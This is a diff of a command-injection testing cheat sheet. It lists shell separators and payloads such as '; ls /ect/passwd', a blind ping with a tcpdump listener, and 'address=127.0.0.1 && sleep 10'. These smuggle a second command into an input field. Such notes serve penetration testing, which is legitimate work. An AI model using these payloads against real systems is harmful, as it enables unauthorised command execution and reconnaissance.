@@ -10,7 +10,7 @@ Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >
 Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
 Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
-Test Blind Sleep: | <code> http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10 </code>
+Test Blind Sleep: | <code> address=127.0.0.1 && sleep 10 </code>
 
 **Comix**
 {% highlight bash %}
